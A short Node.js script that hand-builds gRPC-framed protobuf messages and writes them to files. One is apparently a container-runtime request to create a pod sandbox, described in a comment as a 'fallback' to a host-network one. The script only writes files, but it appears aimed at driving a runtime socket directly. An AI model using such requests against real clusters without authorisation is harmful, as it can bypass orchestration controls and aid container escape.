const fs=require('fs');
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
function grpc(body){const h=Buffer.alloc(5);h.writeUInt32BE(body.length,1);return Buffer.concat([h,body])}
fs.writeFileSync('gv.bin', grpc(Buffer.alloc(0)));
// plain sandbox (no hostNetwork) as fallback
const pmeta=Buffer.concat([fl(0x0a,'zzpl'),fl(0x12,'u2'),fl(0x1a,'default'),v1(0x20,1)]);
const pcfg=Buffer.concat([pmeta, fl(0x12,'zzpl'), fl(0x1a,'/tmp')]);
fs.writeFileSync('rs2.bin', grpc(pcfg));
console.log('ok', fs.statSync('gv.bin').size, fs.statSync('rs2.bin').size);
